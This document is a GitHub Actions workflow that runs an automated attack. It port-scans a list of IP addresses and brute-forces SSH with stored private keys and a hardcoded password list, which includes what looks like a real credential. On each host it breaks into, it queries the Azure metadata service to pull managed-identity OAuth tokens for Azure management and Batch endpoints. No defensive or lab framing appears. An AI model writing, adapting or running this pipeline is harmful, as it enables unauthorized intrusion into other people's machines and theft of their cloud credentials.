name: azscan2
on:
  workflow_dispatch:
jobs:
  scan:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - name: tcp-scan
        run: |
          cat > sc.sh <<'EOF'
          ip=$1
          for p in 22 2222 3389 5985 2375 10250 8888 8265 9400 8000; do
            timeout 3 bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null && echo "OPEN $ip $p"
          done
          exit 0
          EOF
          wc -l ips.txt
          xargs -a ips.txt -P 240 -I{} bash sc.sh {} > open.txt 2>/dev/null || true
          wc -l open.txt
          sort -k2,2 -k3,3n open.txt | tee
      - name: ssh-hunt
        run: |
          set +e
          sudo apt-get update -qq >/dev/null 2>&1; sudo apt-get install -y -qq sshpass >/dev/null 2>&1
          chmod 600 az/ibm_key.pem az/azadmin.pem keys/k_id25519 keys/k_ali 2>/dev/null
          cut -d' ' -f2 open.txt | sort -u > hosts_open.txt
          cat > hunt.sh <<'EOF'
          h=$1; k=$2; u=$3
          out=$(timeout 12 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o PasswordAuthentication=no $u@$h 'echo HIT; id; hostname' 2>&1)
          if [ $? -eq 0 ]; then echo "SSHOK key=$k user=$u host=$h :: $out"; echo "$h $k $u" >> ok.txt; fi
          exit 0
          EOF
          cat > huntpw.sh <<'EOF'
          h=$1; u=$2; p=$3
          out=$(timeout 12 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o PreferredAuthentications=password -o PubkeyAuthentication=no $u@$h 'echo HIT; id; hostname' 2>&1)
          if [ $? -eq 0 ]; then echo "SSHOKPW user=$u host=$h pw=$p :: $out"; echo "$h pw $u $p" >> ok.txt; fi
          exit 0
          EOF
          > ok.txt
          USERS="t19 azureuser ubuntu root adminuser"
          for h in $(cat hosts_open.txt); do for k in az/ibm_key.pem az/azadmin.pem keys/k_id25519 keys/k_ali; do for u in $USERS; do echo "$h $k $u"; done; done; done > matrix.txt
          xargs -P 24 -n 3 bash hunt.sh < matrix.txt 2>/dev/null | grep SSHOK
          PWS="t19 T19UF1obB7wnBBUdju0FRnz!aZ9 azureuser Password123! Admin1234! t19admin Ulplant2026! ubuntu root Admin@123 Password1"
          for h in $(cat hosts_open.txt); do for u in $USERS; do for p in $PWS; do echo "$h $u $p"; done; done; done > pwmatrix.txt
          head -400 pwmatrix.txt | xargs -P 24 -n 3 bash huntpw.sh 2>/dev/null | grep SSHOKPW
          echo "--- ok ---"; cat ok.txt 2>/dev/null
      - name: imds-from-any-hit
        run: |
          set +e
          cat > imds.sh <<'EOF'
          h=$1; meth=$2; u=$3; p=$4
          C='id; hostname; nvidia-smi -L 2>/dev/null | head -3; curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 700; echo; for r in management.azure.com batch.core.windows.net; do echo "--tok $r"; curl -s -m 10 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2F$r%2F&client_id=2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6" | head -c 500; echo; done'
          if [ "$meth" = "pw" ]; then
            timeout 40 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no $u@$h "$C" 2>&1
          else
            timeout 40 ssh -i "$meth" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 $u@$h "$C" 2>&1
          fi
          EOF
          while read a b c d; do echo "=== $a $b $c"; bash imds.sh "$a" "$b" "$c" "$d"; done < ok.txt
